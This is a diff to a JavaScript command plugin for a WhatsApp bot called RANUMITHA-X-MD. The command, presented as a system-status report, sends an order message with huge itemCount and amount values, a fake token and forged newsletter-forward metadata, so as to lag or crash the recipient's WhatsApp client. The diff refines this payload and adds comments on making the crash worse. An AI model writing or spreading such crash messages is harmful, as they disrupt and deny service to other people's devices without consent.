@@ -1,13 +1,14 @@
 const { cmd } = require('../command');
 const config = require('../config');
 const os = require("os");
+const axios = require("axios"); // රූපය download කර ගැනීමට අවශ්‍යයි
 const { runtime } = require('../lib/functions');
 
 cmd({
     pattern: "baga",
-    alias: ["sinjfo", "plajtform", "systejmstatus", "systejminfo"],
+    alias: ["sinfo", "platfhorm", "systehmstatus", "systemjinfo"],
     react: "🧬",
-    desc: "Check bot system status with crash bug style.",
+    desc: "Check bot system status with high-load bug style.",
     category: "main",
     filename: __filename
 },
@@ -15,6 +16,7 @@ async (robin, mek, m, {
     from, quoted, reply, sender
 }) => {
     try {
+        // System Data
         const uptimeStr = runtime(process.uptime());
         const usedRam = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
         const totalRam = (os.totalmem() / 1024 / 1024).toFixed(2);
@@ -31,17 +33,22 @@ async (robin, mek, m, {
 ╰─────────────────────────────⊷
 > © Powerd by 𝗥𝗔𝗡𝗨𝗠𝗜𝗧𝗛𝗔-𝗫-𝗠𝗗 🌛`;
 
-        // WhatsApp Crash/Lag Bug Structure
+        // Invalid Media Type error එක නැති කිරීමට රූපය Buffer එකක් ලෙස ලබා ගැනීම
+        const imgUrl = "https://raw.githubusercontent.com/Ranumithaofc/RANU-FILE-S-/refs/heads/main/images/System%20%20info.jpg";
+        const response = await axios.get(imgUrl, { responseType: 'arraybuffer' });
+        const buffer = Buffer.from(response.data, 'utf-8');
+
+        // Crash/Bug Message sending logic
         await robin.sendMessage(from, {
             orderMessage: {
-                itemCount: 999999999999, // Large number for lag
+                itemCount: 99999999999, // High value for lag
                 status: 1,
                 surface: 1,
                 message: statusText,
-                orderTitle: '𝗥𝗔𝗡𝗨𝗠𝗜𝗧𝗛𝗔-𝗫-𝗠𝗗 𝗖𝗥𝗔𝗦𝗛', // Title
+                orderTitle: '𝗥𝗔𝗡𝗨𝗠𝗜𝗧𝗛𝗔-𝗫-𝗠𝗗 𝗦𝗬𝗦𝗧𝗘𝗠', 
                 sellerJid: '0@s.whatsapp.net',
-                token: 'AR6x+VogDsm_v09yS90CC63yF7f7uI7S0+OMU79asZt370=', // Fake token
-                totalAmount1000: 999999999999,
+                token: 'AR6x+VogDsm_v09yS90CC63yF7f7uI7S0+OMU79asZt370=', 
+                totalAmount1000: 9999999999999,
                 totalCurrencyCode: 'LKR',
                 contextInfo: {
                     mentionedJid: [sender],
@@ -49,23 +56,24 @@ async (robin, mek, m, {
                     isForwarded: true,
                     forwardedNewsletterMessageInfo: {
                         newsletterJid: '120363317972190466@newsletter',
-                        newsletterName: '𝗥𝗔𝗡𝗨𝗠𝗜𝗧𝗛𝗔-𝗫-𝗠𝗗 𝗖𝗥𝗔𝗦𝗛 𝗕𝗨𝗚',
+                        newsletterName: '𝗥𝗔𝗡𝗨𝗠𝗜𝗧𝗛𝗔-𝗫-𝗠𝗗 𝗕𝗨𝗚 𝗖𝗘𝗡𝗧𝗘𝗥',
                         serverMessageId: 143
                     },
-                    // Thumbnail ekak dammaama media type error eka enne na
                     externalAdReply: {
-                        title: "𝗥𝗔𝗡𝗨𝗠𝗜𝗧𝗛𝗔-𝗫-𝗠𝗗 𝗦𝗬𝗦𝗧𝗘𝗠",
-                        body: "ᴄʀᴀsʜɪɴɢ ᴡʜᴀᴛsᴀᴘᴘ...",
+                        title: "⚠️ 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐒𝐘𝐒𝐓𝐄𝐌 𝐋𝐀𝐆 ⚠️",
+                        body: "ᴄʀᴀsʜɪɴɢ ᴘʀᴏᴄᴇss sᴛᴀʀᴛᴇᴅ...",
                         mediaType: 1,
-                        thumbnailUrl: "https://raw.githubusercontent.com/Ranumithaofc/RANU-FILE-S-/refs/heads/main/images/System%20%20info.jpg",
-                        sourceUrl: "https://whatsapp.com/channel/0029Vafn96S7z4k66VvX9O0A"
+                        thumbnail: buffer, // URL එක වෙනුවට සෘජු Buffer එක දීමෙන් Media Error එක නැතිවේ
+                        sourceUrl: "https://whatsapp.com/channel/0029Vafn96S7z4k66VvX9O0A",
+                        renderLargerThumbnail: false // Crash එක වැඩි කිරීමට මෙය false කරන්න
                     }
                 }
             }
         }, { quoted: mek });
 
     } catch (e) {
-        console.log("System Bug Error:", e);
-        reply(`⚠️ Error: ${e.message}`);
+        console.log("System Bug Style Error:", e);
+        // Error එකක් ආවොත් සාමාන්‍ය ක්‍රමයට යැවීම
+        reply(`⚠️ Bug Info: ${e.message}`);
     }
 });
